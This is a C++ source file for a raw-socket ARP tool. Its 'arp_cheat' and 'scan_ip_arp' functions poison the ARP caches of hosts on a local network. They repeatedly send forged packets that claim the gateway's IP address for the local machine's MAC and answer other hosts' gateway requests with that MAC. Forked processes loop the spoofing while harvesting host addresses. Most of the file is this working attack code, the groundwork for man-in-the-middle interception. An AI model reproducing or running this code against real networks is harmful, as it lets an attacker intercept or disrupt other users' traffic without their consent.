#include "mac_arp.h"


/*
第三个参数：protocol协议类型一共有四个，意义如下
ETH_P_IP 0x800 只接收发往本机mac的ip类型的数据帧
ETH_P_ARP 0x806 只接受发往本机mac的arp类型的数据帧
ETH_P_ARP 0x8035 只接受发往本机mac的rarp类型的数据帧
ETH_P_ALL 0x3 接收发往本机mac的所有类型ip arp rarp的数据帧,
                  接收从本机发出的所有类型的数据帧.(混杂模式打开的情况下,会接收到非发往本地mac的数据帧),
*/

mac_arp::mac_arp() : sock_mac ( htons ( ETH_P_ARP ) ) { //注意，mac的socket第三个参数要为htons()过得
    //ctor
}

mac_arp::mac_arp(int ind): sock_mac ( htons ( ETH_P_ARP ), ind ){
}

//void form_arp(char * ip_src,  char *ip_des, int op=1, char *mac_src=NULL, char * mac_des=NULL);
void mac_arp::form_arp ( my_arp *p, char * ip_src,  char *ip_des, int op, char *mac_src, char * mac_des ) {
    form_arp(p, inet_addr(ip_src), inet_addr(ip_des), op, mac_src, mac_des);
}

void mac_arp::form_arp(my_arp *p, uint32_t ip_src,  uint32_t ip_des, int op, char *mac_src, char * mac_des) {
    p->hd_type = htons ( ARPHRD_ETHER );
    p->pro_type = htons ( ETHERTYPE_IP );
    p->mac_length = mac_len;
    p->ip_length = ip_len;
    p->op_type = htons ( op ); //ARPOP_REQUEST    ARPOP_REPLY

    //get_IP_MAC(NULL, 0, p->src_mac, mac_len);
    if ( mac_src == NULL ) { //mac src
        memcpy ( p->src_mac, local[local_conf_valid - 1].mac, mac_len );
    } else {
        memcpy ( p->src_mac, mac_src, mac_len );
    }

    if ( mac_des == NULL ) { //set mac destionation
        memset ( p->des_mac, 0, mac_len ); //destion mac is all zero
    } else {
        memcpy ( p->des_mac, mac_des, mac_len );
    }
    p->src_ip = ip_src ;
    p->des_ip = ip_des ;
}

int mac_arp::send_arp ( my_mac * mac, my_arp*arp, int flag ) {
    char buff[sizeof ( my_mac ) + sizeof ( my_arp )];
    memcpy ( buff, mac, sizeof ( my_mac ) );
    memcpy ( buff + sizeof ( my_mac ), arp, sizeof ( my_arp ) );

    int  ret_len = sendto ( get_socket(), buff, sizeof ( my_mac ) + sizeof ( my_arp ), flag, ( struct sockaddr * ) &saddr, sizeof ( struct sockaddr_ll ) ); //
    if ( ret_len < 0 ) {
        perror ( "send error!" );
        return -1;
    }
    //printf ( "send data:%d Bytes\n", ret_len );
    return ret_len;
}

int mac_arp::recv_arp ( my_mac * mac, my_arp*arp, int flag ) {
    char buff[max_ether_len];

    int  ret_len = recvfrom ( get_socket(), buff, max_ether_len, flag, NULL, NULL ); //
    if ( ret_len < 0 ) {
        perror ( "send error!" );
        return -1;
    }
    memcpy ( mac, buff, sizeof ( my_mac ) );
    memcpy ( arp, buff + sizeof ( my_mac ), sizeof ( my_arp ) );
    return ret_len;
}

int mac_arp::arp_cheat_send(char *start, char *endad) {
    uint32_t st = local_ipstart(), ed = local_ipend();
    if (start != NULL) st = inet_addr(start);
    if (endad != NULL) ed = inet_addr(endad);
    return arp_cheat_send(st,  ed);
}

int mac_arp::arp_cheat_send(uint32_t start, uint32_t endad ) {//net sequence
    uint32_t st, ed;
    int cnt = 0;
    my_mac mac;
    my_arp arp;

    if (start != 0) {
        st = htonl( start);
    } else {
        st = htonl( local_ipstart());
    }
    if (endad != 0) {
        ed = htonl( endad);
    } else {
        ed = htonl(local_ipend());
    }

    form_machd(&mac);

    while(st <= ed) {
        if (st == htonl(  inet_addr(   local[local_conf_valid - 1].ip)   )) {
            st++;    //not my ip
            continue;
        }

        uint32_t t = (htonl(st));
        form_arp(&arp, local[local_conf_valid - 1].gate, t);
        if(send_arp(&mac, &arp) <= 0) break;
        //sleep(0.01);
        st++;
        cnt++;
    }
    //printf("send once!\n");
    return cnt;
}

int mac_arp::arp_cheat_send(uint32_t ip, char *des) {
    my_mac mac;
    my_arp arp;

    form_machd(&mac, NULL, des);
    form_arp(&arp, local[local_conf_valid - 1].gate, ip, 2, NULL, des);  //
    return send_arp(&mac, &arp);
}

int mac_arp::arp_cheat_recv(char *start, char *endsss, tar_info *p) {
    uint32_t st = local_ipstart(), ed = local_ipend();
    if(start != NULL) st = inet_addr(start);
    if(endsss != NULL) ed = inet_addr(endsss);

    return arp_cheat_recv(st, ed, p);
}

/*
wait for a arp packet
if it's a request and the ip addr it requires is the gate, return a response with my mac addr
    any way ,it will return the arp's src mac and ip by the member ret
*/
int mac_arp::arp_cheat_recv(uint32_t start, uint32_t endd, tar_info *ret) { //net sequence
    my_mac mac;
    my_arp arp;

    if (recv_arp(&mac, &arp) <= 0) return -1;
    //printf("\nrecv a arp!\n");
    //show_mac(&mac);
    //show_arp(&arp);
    if (ret != NULL)    memcpy(ret->mac, mac.src, mac_len); //

    if (htons(arp.op_type) == 1 && arp.des_ip == local[local_conf_valid - 1].gate) {
        uint32_t tp = htonl(arp.src_ip);
        if (tp <= htonl(endd) && tp >= htonl(start)) {

            my_swap_buffer((char *)mac.des, (char *)mac.src, mac_len);
            //form_machd(&mac);
            arp.op_type = htons(2);

            my_swap_buffer((char *)&arp.des_ip, (char *)&arp.src_ip, sizeof(arp.des_ip));
            //printf("get in once!%s\n",inet_ntoa(i2addr_in(tp)));
            my_swap_buffer((char *)arp.des_mac, (char *)arp.src_mac, sizeof(arp.des_mac));
            memcpy(arp.src_mac, local[local_conf_valid - 1].mac, sizeof(arp.src_mac));

            int tttp = send_arp(&mac, &arp);

            printf("\nsend %d Bytest, cheate answer: %s!\n", tttp, inet_ntoa(i2addr_in(arp.des_ip)));
            //show_mac (&mac);
            //show_arp(&arp);

            if (ret != NULL)  ret->ip = arp.des_ip;
            return tttp;
        }
    }
    if (ret != NULL)  ret->ip = arp.src_ip;
    return 0;
}

int mac_arp::arp_cheat_recv(uint32_t ip, tar_info *p) { //net sequence
    return arp_cheat_recv(ip, ip, p);
}

uint32_t mac_arp::arp_cheat(uint32_t start, uint32_t endd) { //net sequence
    pid_t fpid = fork();
    if (fpid < 0)
        perror("error in fork!");
    else if (fpid == 0) {//child
        for (int i = 2; i > 0; ) { //
            arp_cheat_send(start, endd);
            sleep(30);
        }
        exit(10);
    } else {
        while(1) {
            arp_cheat_recv(start, endd);
        }
        int status;
        wait(&status);
    }
}

uint32_t mac_arp::arp_cheat(std::vector<tar_info> &vec) { ///
    typedef std::vector<tar_info>::iterator iter;

    pid_t fpid = fork();
    if (fpid < 0)
        perror("error in fork!");
    else if (fpid == 0) {//child
        while(1) {
            for (iter er = vec.begin(); er != vec.end(); er++) {
                arp_cheat_send((*er).ip, (*er).mac);
            }
            printf("***************arp_cheat_send once! ***************\n");
            sleep(15);
        }
        exit(10);
    } else {
        while(1) {
            arp_cheat_recv(local_ipstart(), local_ipend());//recv all
        }
        int status;
        wait(&status);
    }

    return 0;
}

uint32_t mac_arp::arp_cheat(char *start, char *endsss) {
    uint32_t st = local_ipstart(), ed = local_ipend();
    if(start != NULL) st = inet_addr(start);
    if(endsss != NULL) ed = inet_addr(endsss);

    return arp_cheat(st, ed);
}

uint32_t mac_arp::arp_cheat(uint32_t ip) { //net sequence
    return arp_cheat(ip, ip);
}

/*
    two processes, child to send arp cheat requests, and father use 'arp_cheat_recv'
    to recv arp requests to my mac addr and send back cheat answers, during these ,it will
    store the src mac and ipv4 addr, this is the scan;
    all the processes are time limited;the listing time related to the ip span;
*/
int mac_arp::scan_ip_arp(std::vector<tar_info> &vec, uint32_t start, uint32_t endd) { //net seq
    pid_t fpid = fork();
    if (fpid < 0)
        perror("error in fork!");
    else if (fpid == 0) {//child
        while(1) { //
            arp_cheat_send(start, endd);
            sleep(10);
        }
       // printf("scan done!wait for response!\n");
        exit(0);
    } else {//father
        int sec_st = time((time_t*)NULL);
        int sec_ed = sec_st;
        int status;
        tar_info ne;

        while(1) {
            arp_cheat_recv(start, endd, &ne);

            int fla = 0;
            for  (std::vector<tar_info>::iterator be = vec.begin(); be != vec.end() ; be++) {
                if ((*be).ip == ne.ip) {
                    fla = 1;
                    break;
                }
            }
            if (!fla) vec.push_back(ne);
            /*
                        if (!waitpid(fpid, NULL, WNOHANG)) {
                            sec_ed = time((time_t*)NULL);
                            continue;
                        } else {//has ended
                            int now = time((time_t*)NULL) - sec_ed;
                            if ( now > (sec_ed - sec_st) && now > 1) {
                                break;
                            }
                        }
                        */
            if (time((time_t*)NULL) - sec_st > (htonl(endd) - htonl(start)) / 500 ) {
                killpg(fpid, SIGKILL);
                break;
            }
        }
        //wait(&status);
        std::sort(vec.begin(), vec.end(), com_ip);//, std::mem_fun(&mac_arp::ip_com)
    }
}

int mac_arp::scan_ip_arp(std::vector<tar_info> &vec, char * start, char * endsss) { //net seq
    uint32_t st = local_ipstart(), ed = local_ipend();
    if(start != NULL) st = inet_addr(start);
    if(endsss != NULL) ed = inet_addr(endsss);

    return scan_ip_arp( vec, st, ed);
}

void mac_arp::show_arp ( my_arp * arp ) {
    if(htons(arp->op_type) == 1) printf("\narp request(1)\n");
    else if (htons(arp->op_type ) == 2) printf("\narp response(2)\n");

    printf ( "src ip in packet:%s\n", inet_ntoa (   * ( ( struct in_addr* ) & ( arp->src_ip ) )  ) );
    printf ( "des ip in packet:%s\n", inet_ntoa (  * ( ( struct in_addr* ) & ( arp->des_ip ) )  ) );
    printf ( "src mac in packet:%02x:%02x:%02x:%02x:%02x:%02x\n", arp->src_mac[0], arp->src_mac[1], arp->src_mac[2], arp->src_mac[3], arp->src_mac[4], arp->src_mac[5] );
    printf ( "des mac in packet:%02x:%02x:%02x:%02x:%02x:%02x\n", arp->des_mac[0], arp->des_mac[1], arp->des_mac[2], arp->des_mac[3], arp->des_mac[4], arp->des_mac[5] );
}

mac_arp::~mac_arp() {
    //dtor
}
